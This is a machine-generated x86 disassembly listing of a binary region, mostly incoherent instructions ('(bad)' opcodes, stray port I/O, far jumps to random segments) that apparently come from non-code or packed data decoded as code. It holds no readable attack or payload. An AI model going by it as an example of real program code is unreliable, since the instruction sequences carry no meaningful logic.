  424e82:	mov    ch,0x7a
  424e84:	mov    al,0x89
  424e86:	add    DWORD PTR [eax],eax
  424e88:	add    al,0x1
  424e8a:	add    BYTE PTR [eax],al
  424e8c:	mov    BYTE PTR [ebp-0x36972067],cl
  424e92:	add    BYTE PTR ds:[ecx-0x1b88fcc5],0x84
  424e9a:	daa    
  424e9b:	(bad)  
  424e9c:	adc    eax,0xd94aef5e
  424ea1:	sbb    al,0x7b
  424ea3:	push   edx
  424ea4:	cmc    
  424ea5:	les    ebx,FWORD PTR ds:0x588292cd
  424eab:	push   eax
  424eac:	xor    al,BYTE PTR [edx]
  424eae:	lods   eax,DWORD PTR ds:[esi]
  424eaf:	mov    bh,0x81
  424eb1:	ds pop ss
  424eb3:	add    BYTE PTR [ecx+0x4ef89bca],dh
  424eb9:	and    eax,0x32c40287
  424ebe:	jb     0x424e82
  424ec0:	ds fwait
  424ec2:	cmp    DWORD PTR [edi],esi
  424ec4:	sub    ch,BYTE PTR [esi-0x2cd6e795]
  424eca:	cmp    al,0x9c
  424ecc:	adc    ecx,DWORD PTR [ecx+ecx*2+0x78]
  424ed0:	mov    esp,0xa78f198e
  424ed5:	inc    eax
  424ed6:	stos   BYTE PTR es:[edi],al
  424ed7:	xor    ebp,esi
  424ed9:	add    dl,BYTE PTR [edx-0x3738642a]
  424edf:	xchg   ebp,eax
  424ee0:	adc    al,0xea
  424ee2:	push   edx
  424ee3:	mov    eax,ds:0x92038506
  424ee8:	stos   DWORD PTR es:[edi],eax
  424ee9:	or     edi,esp
  424eeb:	lahf   
  424eec:	pop    ebx
  424eed:	pop    es
  424eee:	adc    DWORD PTR [edx],esi
  424ef0:	jae    0x424e83
  424ef2:	jg     0x424f01
  424ef4:	sbb    esp,DWORD PTR [esi-0x40cf185b]
  424efa:	push   ebx
  424efb:	(bad)  
  424efc:	and    eax,0x24536c2
  424f01:	lds    ebp,FWORD PTR [ecx-0x50a669b9]
  424f07:	dec    edi
  424f08:	out    dx,al
  424f09:	lahf   
  424f0a:	sub    eax,0x67dec477
  424f0f:	adc    al,0xf4
  424f11:	rol    BYTE PTR [eax-0x4d2b3568],cl
  424f17:	xchg   esp,eax
  424f18:	sbb    DWORD PTR [ebx],edx
  424f1a:	or     cl,BYTE PTR [eax]
  424f1c:	jmp    0xa761:0x96b1f4c1
  424f23:	lock sbb BYTE PTR cs:[ecx-0x5f3f483c],ah
  424f2b:	int3   
  424f2c:	and    BYTE PTR [ebp-0x23],bh
  424f2f:	push   ds
  424f30:	addr16 mov ds:0x334b,al
  424f34:	das    
  424f35:	mov    ebp,0x17dbd289
  424f3a:	adc    al,0x22
  424f3c:	popa   
  424f3d:	cmp    edx,DWORD PTR ds:0x226fad46
  424f43:	ja     0x424fb8
  424f45:	pusha  
  424f46:	cwde   
  424f47:	scas   eax,DWORD PTR es:[edi]
  424f48:	pop    ds
  424f49:	popf   
  424f4a:	or     bl,BYTE PTR ds:0xb465351e
  424f50:	cmp    ah,BYTE PTR [eax+edi*8]
  424f53:	mov    ds:0x5752c8ce,eax
  424f58:	pop    ebp
  424f59:	jno    0x424eee
  424f5b:	and    eax,0xfacb8401
  424f60:	lods   al,BYTE PTR ds:[esi]
  424f61:	pop    edi
  424f62:	pop    ecx
  424f63:	idiv   dh
  424f65:	loopne 0x424fae
  424f67:	sbb    eax,0x5f5cfe42
  424f6c:	jecxz  0x424f89
  424f6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f6f:	stos   DWORD PTR es:[edi],eax
  424f70:	jle    0x424fc4
  424f72:	fnsave [ebp+0x29]
  424f75:	inc    ebx
  424f76:	jo     0x424efe
  424f78:	leave  
  424f79:	out    0xc7,eax
  424f7b:	mov    al,0x80
  424f7d:	js     0x424f7b
  424f7f:	mov    esp,0x578ce61a
  424f84:	push   ds
  424f85:	loopne 0x424f8c
  424f87:	sbb    DWORD PTR ds:0x511a99f8,ebx
  424f8d:	xor    BYTE PTR ds:0xa4,cl
	...
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	jae    0x424f9d
  425002:	pop    edi
  425003:	jo     0x424fb9
  425005:	mov    al,BYTE PTR [ecx]
  425007:	add    BYTE PTR [ecx+eax*1],al
  42500a:	add    BYTE PTR [eax],al
  42500c:	xchg   ecx,eax
  42500d:	mov    DWORD PTR [esi],edx
  42500f:	mov    cl,0x28
  425011:	push   0xbef5dd92
  425016:	mov    eax,ds:0x4fd5c571
  42501b:	mov    bl,0x7d
  42501d:	inc    ecx
  42501e:	outs   dx,BYTE PTR ds:[esi]
  42501f:	dec    edi
  425020:	jne    0x425035
  425022:	and    DWORD PTR [esp+ecx*4],edi
  425025:	jmp    0x425013
  425027:	add    ebp,edi
  425029:	stc    
  42502a:	xor    BYTE PTR [esi+esi*4],dl
  42502d:	pop    esp
  42502e:	jne    0x424fc9
  425030:	hlt    
  425031:	sbb    al,0x43
  425033:	pusha  
  425034:	mov    ds:0xa26ce5cf,eax
  425039:	nop
  42503a:	cwde   
  42503b:	dec    esi
  42503c:	add    BYTE PTR [edx+0x48d4fbb8],ah
  425042:	mov    edx,cs
  425044:	inc    esp
  425045:	pop    es
  425046:	mov    ch,0xca
  425048:	ins    DWORD PTR es:[edi],dx
  425049:	push   ebp
  42504a:	xchg   ecx,eax
  42504b:	mov    WORD PTR [ebx+0x6e],ds
  42504e:	rcr    BYTE PTR [edi],cl
  425050:	jg     0x425042
  425052:	cmp    ah,BYTE PTR [edi+0x4c]
  425055:	imul   edx,DWORD PTR [esi+0x31],0xfffffff4
  425059:	sbb    edx,esp
  42505b:	hlt    
  42505c:	jmp    0xde62:0xe8011276
  425063:	mov    BYTE PTR [edi-0x3f],ch
  425066:	cmp    BYTE PTR [esi+ebx*1],ah
  425069:	sti    
  42506a:	pop    esp
  42506b:	sbb    al,0x6e
  42506d:	call   0x27e4:0xb95c8019
  425074:	mov    edi,0xc60db1d5
  425079:	or     al,0xca
  42507b:	or     al,0xa2
  42507d:	adc    DWORD PTR [ecx+ebp*1],edi
  425080:	sbb    BYTE PTR [ebx*1-0x6890c563],dh
  425087:	jmp    0xf8d8:0xbda18f27
  42508e:	int3   
  42508f:	bound  edx,QWORD PTR [eax+eax*1+0x73c0edfe]
  425096:	(bad)  
  425097:	aaa    
  425098:	push   ebx
  425099:	xor    BYTE PTR [edi-0x15c1bc0d],0x78
  4250a0:	popf   
  4250a1:	lock ror BYTE PTR [eax-0x6],cl
  4250a5:	out    dx,al
  4250a6:	fidiv  WORD PTR [ebx+esi*2]
  4250a9:	or     ebp,esi
  4250ab:	dec    eax
  4250ac:	test   DWORD PTR [esi],edx
  4250ae:	popa   
  4250af:	pushf  
  4250b0:	iret   
  4250b1:	jecxz  0x425040
  4250b3:	popa   
  4250b4:	repnz aas 
  4250b6:	das    
  4250b7:	cs dec ebx
  4250b9:	pop    ecx
  4250ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250bb:	xchg   esi,eax
  4250bc:	rcl    BYTE PTR [edx+0x25886b26],cl
  4250c2:	or     DWORD PTR [edi-0x70],eax
  4250c5:	jp     0x4250ab
  4250c7:	push   esi
  4250c8:	ffreep st(6)
  4250ca:	cmp    DWORD PTR [edx+0x1762a345],esi
  4250d0:	mov    eax,0x5e5a18ae
  4250d5:	or     BYTE PTR [edi+0x590495f7],dh
  4250db:	lods   al,BYTE PTR ds:[esi]
  4250dc:	push   ds
  4250dd:	xchg   edi,eax
  4250de:	sbb    BYTE PTR [esi],ah
  4250e0:	or     DWORD PTR [esi+0x7b0f4901],ebx
  4250e6:	jns    0x42507b
  4250e8:	mov    eax,ds
  4250ea:	push   edx
  4250eb:	gs popa 
  4250ed:	pop    edi
  4250ee:	aas    
  4250ef:	test   eax,0x666daa47
  4250f4:	jns    0x425080
  4250f6:	and    ch,BYTE PTR [eax-0x24]
  4250f9:	push   cs
  4250fa:	leave  
  4250fb:	sti    
  4250fc:	enter  0xf239,0x17
  425100:	lds    ebx,FWORD PTR [esi-0x2a]
  425103:	clc    
  425104:	hlt    
  425105:	out    0x63,eax
  425107:	neg    dh
  425109:	inc    ebx
  42510a:	mov    ds:0xe552bf06,al
  42510f:	add    BYTE PTR [bx+si],al
	...
  425172:	add    BYTE PTR [eax],al
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0xdf92:0x1cba92e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    BYTE PTR [edx+0x69],bl
  42518e:	pop    esi
  42518f:	sbb    dl,BYTE PTR [edx-0x40e1c57c]
  425195:	mov    edx,0x450b69d0
  42519a:	jle    0x4251df
  42519c:	cld    
  42519d:	mov    eax,0x9be2bddb
  4251a2:	sbb    al,0x16
  4251a4:	jecxz  0x4251cb
  4251a6:	mov    bh,0x10
  4251a8:	stos   BYTE PTR es:[edi],al
  4251a9:	cs or  eax,0xf8cc5a41
  4251af:	mov    edx,0xe07bf000
  4251b4:	inc    eax
  4251b5:	outs   dx,BYTE PTR ds:[esi]
  4251b6:	das    
  4251b7:	fdiv   QWORD PTR [edi+0x389ae879]
  4251bd:	ins    BYTE PTR es:[edi],dx
  4251be:	mov    bl,0xcd
  4251c0:	fwait
  4251c1:	inc    edi
  4251c2:	(bad)
  4251c5:	sub    al,BYTE PTR [ecx]
  4251c7:	jmp    0x47930e45
  4251cc:	or     esi,DWORD PTR [edi+0x12bb00e5]
  4251d2:	stc    
  4251d3:	shl    DWORD PTR [eax+0x41],cl
  4251d6:	xor    ebx,ebx
  4251d8:	or     eax,0xd696849e
  4251dd:	(bad)  
  4251de:	jmp    0xa18b02e7
  4251e3:	scas   eax,DWORD PTR es:[edi]
  4251e4:	xchg   ebp,eax
  4251e5:	(bad)  
  4251e6:	jb     0x42519c
  4251e8:	xchg   edi,eax
  4251e9:	adc    DWORD PTR [ecx-0x70],0xfffffff2
  4251ed:	xchg   esi,eax
  4251ee:	std    
  4251ef:	sbb    eax,0x3523d0bc
  4251f4:	pop    ds
  4251f5:	sub    ah,BYTE PTR [eax]
  4251f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251f8:	std    
  4251f9:	jo     0x4251a3
  4251fb:	into   
  4251fc:	pushf  
  4251fd:	lock int3 
  4251ff:	fistp  QWORD PTR [esi+0x26311e94]
  425205:	pop    ebp
  425206:	stos   BYTE PTR es:[edi],al
  425207:	xchg   esp,eax
  425208:	mov    ch,0xd4
  42520a:	jnp    0x4251f5
  42520c:	lock adc al,0xc8
  42520f:	iret   
  425210:	add    al,0xe3
  425212:	mov    ebp,0xfc63a3bf
  425217:	push   ss
  425218:	bound  ecx,QWORD PTR [ebp+esi*2+0x548c6ab3]
  42521f:	jne    0x42526c
  425221:	in     eax,0xf2
  425223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425224:	je     0x42520d
  425226:	add    eax,0xf58b95e0
  42522b:	mov    eax,ds:0xc713ffb3
  425230:	daa    
  425231:	test   BYTE PTR [edx-0x2c],cl
  425234:	dec    ebx
  425235:	jnp    0x42524c
  425237:	aaa    
  425238:	aad    0x4f
  42523a:	(bad)
  42523f:	test   BYTE PTR [ecx],0x0
  425242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425243:	xor    bl,dl
  425245:	scas   eax,DWORD PTR es:[edi]
  425246:	mov    dl,BYTE PTR [esi-0x19740dad]
  42524c:	mov    ch,BYTE PTR [edi-0x1494060c]
  425252:	into   
  425253:	xor    BYTE PTR [ecx],bh
  425255:	sub    DWORD PTR [eax+eax*2],ebp
  425258:	jge    0x4252a6
  42525a:	inc    esi
  42525b:	nop
  42525c:	and    edx,DWORD PTR [ebx-0x46]
  42525f:	lahf   
  425260:	pushf  
  425261:	ret    0xb961
  425264:	mov    al,BYTE PTR [eax-0x2f]
  425267:	xor    ch,BYTE PTR [ebx]
  425269:	int    0x8a
  42526b:	call   FWORD PTR [ebx+0x18ad044]
  425271:	sub    BYTE PTR [edx],bl
  425273:	sahf   
  425274:	loop   0x425238
  425276:	mov    edx,0x91bd1aa8
  42527b:	lahf   
  42527c:	cmp    esp,esi
  42527e:	pop    es
  42527f:	jnp    0x4252e3
  425281:	xor    eax,0xf67bf683
  425286:	mov    cl,0x7d
  425288:	fisub  DWORD PTR [edx]
  42528a:	and    ebp,DWORD PTR [edi-0x4f861f8e]
	...
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	out    0xc6,al
  425302:	xor    edx,edx
  425304:	mov    esp,0x400018c
  425309:	add    DWORD PTR [eax],eax
  42530b:	add    cl,dl
  42530d:	xor    cl,BYTE PTR [ebx]
  42530f:	add    ah,BYTE PTR [ebp+0x71d1a9c1]
  425315:	push   ds
  425316:	arpl   WORD PTR [edi+0x32],cx
  425319:	push   edx
  42531a:	inc    ecx
  42531b:	push   eax
  42531c:	enter  0xcaf1,0xf8
  425320:	icebp  
  425321:	fcom   QWORD PTR [edx+0x45ddf8f3]
  425327:	adc    DWORD PTR [esi],esi
  425329:	div    DWORD PTR [esi]
  42532b:	adc    BYTE PTR [ebx],0xb9
  42532e:	imul   esp,DWORD PTR [ebx-0x6982ba53],0xffffffbf
  425335:	in     eax,dx
  425336:	mov    al,ds:0xddae0882
  42533b:	xchg   esi,eax
  42533d:	or     ah,bh
  42533f:	in     al,0x97
  425341:	dec    edx
  425342:	or     ebp,DWORD PTR [ebx]
  425344:	aad    0xf5
  425346:	out    dx,eax
  425347:	out    0xb2,eax
  425349:	push   ebx
  42534a:	aad    0xfd
  42534c:	jge    0x42530e
  42534e:	adc    eax,0x6323df11
  425353:	jmp    0xdc94:0x6e21fde3
  42535a:	mov    al,0x8f
  42535c:	pop    edi
  42535d:	inc    eax
  42535e:	and    ebp,0xffffffdc
  425361:	xchg   esp,eax
  425362:	sub    DWORD PTR ds:0x50c9717e,0xffffffb7
  425369:	sub    eax,0xbf1dfdac
  42536e:	inc    eax
  42536f:	arpl   WORD PTR [edi-0x8c31621],bx
  425375:	mov    DWORD PTR [eax],eax
  425377:	push   esi
  425378:	mov    dl,0xa7
  42537a:	push   eax
  42537b:	dec    edi
  42537c:	pop    ebp
  42537d:	sahf   
  42537e:	and    eax,DWORD PTR [edx]
  425380:	aad    0x8d
  425382:	xchg   ebp,eax
  425383:	pop    esi
  425384:	xchg   edi,eax
  425385:	cmp    esp,DWORD PTR [edx+eax*4]
  425388:	cld    
  425389:	inc    edx
  42538a:	xchg   edi,eax
  42538b:	jb     0x4253b7
  42538d:	add    BYTE PTR [edi+esi*2],bl
  425390:	lahf   
  425391:	mov    esi,0xc87edec0
  425396:	scas   al,BYTE PTR es:[edi]
  425397:	mov    WORD PTR [edx],fs
  425399:	es hlt 
  42539b:	jl     0x4253dc
  42539d:	mov    ecx,0x4541f9b6
  4253a2:	dec    ebx
  4253a3:	enter  0x604d,0xac
  4253a7:	mov    eax,ds:0x8df149d6
  4253ac:	ds cmp BYTE PTR ds:[eax+eiz*2-0xc43b159],ch
  4253b5:	ins    DWORD PTR es:[edi],dx
  4253b6:	nop
  4253b7:	dec    ecx
  4253b8:	add    DWORD PTR [edi+0x2e],0xec7a7437
  4253bf:	pusha  
  4253c0:	retf   0x1ee3
  4253c3:	mov    al,ds:0x3941dabf
  4253c8:	mov    edx,0xbe981a8b
  4253cd:	sub    eax,0x5839e5bd
  4253d2:	push   DWORD PTR [edi]
  4253d4:	push   ss
  4253d5:	and    BYTE PTR [ecx-0x5b],cl
  4253d8:	or     eax,0xcec88103
  4253dd:	pop    ds
  4253de:	cdq    
  4253df:	or     BYTE PTR [edx+0x38],0x98
  4253e3:	fnstcw WORD PTR [esi-0x3718cf77]
  4253e9:	out    0xa2,al
  4253eb:	jl     0x4253d7
  4253ed:	divps  xmm4,xmm3
  4253f0:	ret    
  4253f1:	push   ebx
  4253f2:	int    0xd0
  4253f4:	test   DWORD PTR gs:[edi],ebp
  4253f7:	push   cs
  4253f8:	push   edi
  4253f9:	fnstcw WORD PTR [eax+eax*1-0x49]
  4253fd:	pop    ebx
  4253fe:	mov    al,ds:0x23d172b3
  425403:	pop    es
  425404:	push   ebp
  425405:	and    esi,edi
  425407:	mov    al,0x1f
  425409:	cmp    cl,bl
  42540b:	xchg   edx,eax
  42540c:	jl     0x425429
  42540e:	addr16 mov ch,0x0
	...
  425471:	add    BYTE PTR [eax],al
  425473:	add    BYTE PTR [edx+0x9],al
  425476:	les    ebp,FWORD PTR [ecx-0x14901231]
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ebx,DWORD PTR [edi-0x3f1d0f98]
  425485:	lea    eax,[ecx]
  425487:	add    BYTE PTR [ecx+eax*1],al
  42548a:	add    BYTE PTR [eax],al
  42548c:	sbb    BYTE PTR [ebx+0x4b],0x7f
  425490:	imul   esi,DWORD PTR [ecx+0xf],0xffffffda
  425494:	xchg   BYTE PTR [eax+0x68],ah
  425497:	jb     0x42541f
  425499:	push   ebx
  42549a:	int    0xe3
  42549c:	gs inc ebx
  42549e:	xchg   edx,eax
  42549f:	mov    eax,0x462c367f
  4254a4:	test   DWORD PTR [ebx],0x2ea5debf
  4254aa:	ja     0x4254ac
  4254ac:	jmp    0x42551d
  4254ae:	jns    0x4254d8
  4254b0:	cmp    BYTE PTR [edi+0x713b6ae2],0x90
  4254b7:	xor    ebx,esp
  4254b9:	stos   DWORD PTR es:[edi],eax
  4254ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254bb:	push   cs
  4254bc:	pop    ebx
  4254bd:	and    BYTE PTR [eax+edi*4-0x5f4d0c0c],dl
  4254c4:	adc    DWORD PTR [ebx+0x50],esi
  4254c7:	leave  
  4254c8:	leave  
  4254c9:	xchg   ebp,eax
  4254ca:	retf   
  4254cb:	sub    bh,BYTE PTR [edi+0xc]
  4254ce:	sbb    DWORD PTR es:[edi+esi*2],edi
  4254d2:	cmp    ebx,DWORD PTR [edi]
  4254d4:	ret    
  4254d5:	(bad)
  4254d8:	mov    al,0x24
  4254da:	inc    ebp
  4254db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254dc:	fmul   QWORD PTR [ecx]
  4254de:	(bad)  
  4254df:	test   BYTE PTR [esi+esi*1+0x25e15fe6],dh
  4254e6:	repnz addr16 out 0x79,eax
  4254ea:	push   eax
  4254eb:	pop    ds
  4254ec:	sti    
  4254ed:	xor    eax,0x76ee7259
  4254f2:	inc    edi
  4254f3:	call   0x40050e7
  4254f8:	add    dh,ah
  4254fa:	pop    ecx
  4254fb:	and    ch,0x8d
  4254fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254ff:	fdivr  DWORD PTR [esp+ebp*8+0x48]
  425503:	or     DWORD PTR [edi],edx
  425505:	mov    edi,0x3b206d3b
  42550a:	test   al,0xff
  42550c:	xchg   bh,ch
  42550e:	fild   WORD PTR [ecx-0x69]
  425511:	jl     0x425586
  425513:	inc    esp
  425514:	xchg   esi,eax
  425515:	mov    dl,0x4d
  425517:	cmp    eax,0x9c29d5a0
  42551c:	jo     0x425516
  42551e:	rcr    DWORD PTR [edx-0x2d],cl
  425521:	xor    al,0x5
  425523:	lods   al,BYTE PTR ds:[esi]
  425524:	jno    0x42557b
  425526:	fstp   DWORD PTR [ecx]
  425528:	and    dh,ch
  42552a:	clc    
  42552b:	pop    edx
  42552c:	int3   
  42552d:	or     ecx,ecx
  42552f:	add    eax,0xcb8b5b6b
  425534:	daa    
  425535:	popa   
  425536:	inc    ecx
  425537:	mov    WORD PTR [ebx+ebp*4],fs
  42553a:	mov    cs:0xb46952a9,eax
  425540:	xchg   ecx,eax
  425541:	mov    BYTE PTR [eax+0x774afd00],ch
  425547:	lea    si,[esi]
  42554a:	xchg   ebp,eax
  42554b:	sub    eax,0x373a74af
  425550:	addr16 mov ch,0x4
  425553:	pmulhw xmm4,XMMWORD PTR [eax+0x5]
  425558:	ins    BYTE PTR es:[edi],dx
  425559:	pusha  
  42555a:	or     dl,BYTE PTR [edx+0xa9fb8d7]
  425560:	clc    
  425561:	sub    al,0xec
  425563:	or     DWORD PTR [esi+0x19562f0f],0xffffffba
  42556a:	mov    bh,0xf4
  42556c:	pop    ss
  42556d:	mov    ebp,0x74db226f
  425572:	out    dx,eax
  425573:	dec    ebp
  425574:	pop    esp
  425575:	sub    eax,0xab35f8e4
  42557a:	pop    esi
  42557b:	imul   edi,DWORD PTR [edx+0xc],0xfaa81054
  425582:	sbb    cl,dl
  425584:	test   BYTE PTR [edx+eax*8+0x2e032eef],dh
  42558b:	shr    BYTE PTR [edx],0x46
  42558e:	stos   BYTE PTR es:[edi],al
  42558f:	pop    edx
	...
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xe029f13a
  425602:	mov    ax,0x8ec4
  425606:	add    DWORD PTR [eax],eax
  425608:	add    al,0x1
  42560a:	add    BYTE PTR [eax],al
  42560c:	cs retf 
  42560e:	mov    esp,0x127beafd
  425613:	int    0xbb
  425615:	xchg   esp,eax
  425616:	pop    edx
  425617:	sbb    bl,ch
  425619:	es push ss
  42561b:	addr16 mov edx,0x5ad6aa03
  425621:	cld    
  425622:	stc    
  425623:	sar    bh,cl
  425625:	mov    edi,DWORD PTR [ecx-0x65]
  425628:	sbb    bh,BYTE PTR [edi-0x62]
  42562b:	das    
  42562c:	push   edx
  42562d:	imul   ebx,ebp,0xc833e72e
  425633:	mov    ah,0x3d
  425635:	sub    eax,0x2fd89d99
  42563a:	fwait
  42563b:	ja     0x4255d6
  42563d:	jg     0x4256a2
  42563f:	xchg   ebp,eax
  425640:	in     al,dx
  425641:	shl    esi,cl
  425643:	jg     0x4256ac
  425645:	arpl   WORD PTR [eax+0x5],bx
  425648:	xor    al,0xdd
  42564a:	stc    
  42564b:	aaa    
  42564c:	ret    
  42564d:	adc    ah,cl
  42564f:	aaa    
  425650:	xor    eax,0x7a9f84ba
  425655:	sub    DWORD PTR [ebp+edx*2-0x239a4fe1],eax
  42565c:	push   ss
  42565d:	pop    edi
  42565e:	cmp    eax,0xdd4ec2c8
  425663:	(bad)  
  425664:	loope  0x42564a
  425666:	mov    ebp,0x5ed05304
  42566b:	sti    
  42566c:	imul   eax,DWORD PTR [edx],0x15
  42566f:	mov    WORD PTR [ecx+0x0],?
  425672:	icebp  
  425673:	cmp    esi,0x199b9ae8
  425679:	int    0xdf
  42567b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42567c:	lods   al,BYTE PTR ds:[esi]
  42567d:	fist   DWORD PTR [eax]
  42567f:	mov    cl,0x8a
  425681:	dec    ebp
  425682:	jne    0x4256d1
  425684:	call   0x1aac35be
  425689:	xchg   ebx,eax
  42568a:	push   0xffffffda
  42568c:	popf   
  42568d:	js     0x425685
  42568f:	je     0x4256c2
  425691:	inc    esp
  425692:	cmp    eax,esp
  425694:	and    DWORD PTR [ebx],ecx
  425696:	js     0x4256ae
  425698:	inc    esi
  425699:	cmp    BYTE PTR [ebp-0x12cd6480],0x46
  4256a0:	adc    al,0x56
  4256a2:	push   ebp
  4256a3:	sti    
  4256a4:	addr16 js 0x425718
  4256a7:	inc    esp
  4256a8:	add    al,0xe7
  4256aa:	sbb    al,0x62
  4256ac:	and    esi,edi
  4256ae:	imul   ebp,DWORD PTR ds:0x4d8428da,0xffffff9c
  4256b5:	out    dx,al
  4256b6:	adc    al,0x29
  4256b8:	inc    ecx
  4256b9:	pop    esp
  4256ba:	shr    BYTE PTR [eax-0x3f],cl
  4256bd:	popf   
  4256be:	push   ebx
  4256bf:	repnz sub dl,ch
  4256c2:	push   esp
  4256c3:	push   ebx
  4256c4:	mov    ebp,0x671546e3
  4256c9:	cmp    eax,0x38269292
  4256ce:	adc    edx,DWORD PTR [esi-0x28a1fbf]
  4256d4:	jge    0x425670
  4256d6:	cmc    
  4256d7:	fsub   DWORD PTR [esi+0x16]
  4256da:	sbb    ah,BYTE PTR [ecx-0x2be286d3]
  4256e0:	push   cs
  4256e1:	loop   0x42573a
  4256e3:	dec    edi
  4256e4:	shl    DWORD PTR [eax],1
  4256e6:	mov    edx,0x33a25be5
  4256eb:	mov    edx,0x75e41287
  4256f0:	inc    esp
  4256f1:	dec    ebp
  4256f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256f3:	int    0x89
  4256f5:	fs adc edx,ebp
  4256f8:	cmp    ebx,ecx
  4256fa:	mov    ecx,esi
  4256fc:	adc    ebx,DWORD PTR [esi+eiz*2+0x66]
  425700:	cli    
  425701:	int3   
  425702:	sub    DWORD PTR [edx],esp
  425704:	mov    bh,0x4
  425706:	ins    BYTE PTR es:[edi],dx
  425707:	sbb    al,0x8c
  425709:	popf   
  42570a:	loope  0x4256a9
  42570c:	test   eax,0xc53b45
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0xdcc6bb74
  425783:	jno    0x42574d
  425785:	pop    DWORD PTR [ecx]
  425787:	add    BYTE PTR [ecx+eax*1],al
  42578a:	add    BYTE PTR [eax],al
  42578c:	jnp    0x425767
  42578e:	adc    al,0x4d
  425790:	jmp    0x49cd912b
  425795:	lahf   
  425796:	test   eax,0x8e1d4e3c
  42579b:	lds    esp,FWORD PTR [ebx]
  42579d:	mov    cl,bl
  42579f:	cmp    bh,BYTE PTR [edx+eiz*2-0x2f]
  4257a3:	pop    esi
  4257a4:	push   eax
  4257a5:	into   
  4257a6:	inc    ecx
  4257a7:	jbe    0x4257b4
  4257a9:	xchg   ebx,eax
  4257aa:	add    edi,DWORD PTR [ebx+0x743665a6]
  4257b0:	dec    eax
  4257b1:	mov    ds:0x14a3ed0,al
  4257b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257b7:	je     0x42581a
  4257b9:	lods   al,BYTE PTR ds:[esi]
  4257ba:	add    dl,BYTE PTR [edx-0x34]
  4257bd:	call   0xcd9cdcd6
  4257c2:	daa    
  4257c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257c4:	nop
  4257c5:	mov    ah,0x4a
  4257c7:	jae    0x42582d
  4257c9:	xchg   DWORD PTR [edi+edx*4-0x75],edi
  4257cd:	neg    DWORD PTR [ebx-0x26810ef6]
  4257d3:	jp     0x4257aa
  4257d5:	adc    BYTE PTR [esi+0x544d4279],cl
  4257db:	adc    eax,edi
  4257dd:	mov    esp,0x5d03583e
  4257e2:	dec    ebx
  4257e3:	addr16 xor al,0x2e
  4257e6:	int3   
  4257e7:	aas    
  4257e8:	adc    edx,DWORD PTR [edi]
  4257ea:	and    eax,0xcef4dda1
  4257ef:	mov    eax,0x6ac0bcde
  4257f4:	jp     0x425781
  4257f6:	adc    al,0xe
  4257f8:	adc    eax,0x2d98a8a1
  4257fd:	aam    0xdc
  4257ff:	out    0x50,eax
  425801:	cmp    DWORD PTR [edi-0x3d5630e7],0xffffffb0
  425808:	fst    QWORD PTR [eax+0x9]
  42580b:	in     al,dx
  42580c:	or     BYTE PTR [edx-0x3475b813],ch
  425812:	and    DWORD PTR [ecx+0x4a178190],edx
  425818:	push   eax
  425819:	hlt    
  42581a:	out    0xd9,al
  42581c:	es mov ah,bl
  42581f:	jl     0x4257b2
  425821:	(bad)  
  425822:	std    
  425823:	sub    al,0x32
  425825:	sbb    DWORD PTR [ebx-0x50366c42],ecx
  42582b:	test   eax,0x5cb35016
  425830:	cdq    
  425831:	rol    dh,0xb8
  425834:	aad    0x66
  425836:	call   0x586cb3be
  42583b:	setns  BYTE PTR [eax+0x4feced76]
  425842:	push   edx
  425843:	sahf   
  425844:	lods   al,BYTE PTR ds:[esi]
  425845:	fsub   st(0),st
  425847:	retf   0xbc86
  42584a:	pusha  
  42584b:	clc    
  42584c:	inc    ebp
  42584d:	xchg   edi,eax
  42584e:	mov    cl,0x1d
  425850:	(bad)  
  425851:	shr    BYTE PTR [esi],1
  425853:	cmp    cl,al
  425855:	pop    edx
  425856:	(bad)  
  425857:	icebp  
  425858:	mov    al,ds:0x36c56bda
  42585d:	sub    eax,ebp
  42585f:	out    0xc4,al
  425861:	mov    ecx,0x6351069
  425866:	dec    ebx
  425867:	iret   
  425868:	mov    cl,ah
  42586a:	adc    BYTE PTR [esi-0x6a],ch
  42586d:	leave  
  42586e:	push   edx
  42586f:	xchg   edx,eax
  425870:	pop    edi
  425871:	pop    ss
  425872:	push   0x6393a691
  425877:	inc    eax
  425878:	retf   0xcdda
  42587b:	mov    esp,DWORD PTR [edx-0x22ac4f62]
  425881:	cmp    esp,DWORD PTR [edi+eiz*4]
  425884:	rol    DWORD PTR [ebx],1
  425886:	mov    ebp,DWORD PTR [edi+0x15d1ecb1]
  42588c:	pop    esi
  42588d:	sbb    edi,0xffffffe4
	...
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	dec    edi
  425901:	out    0x2f,eax
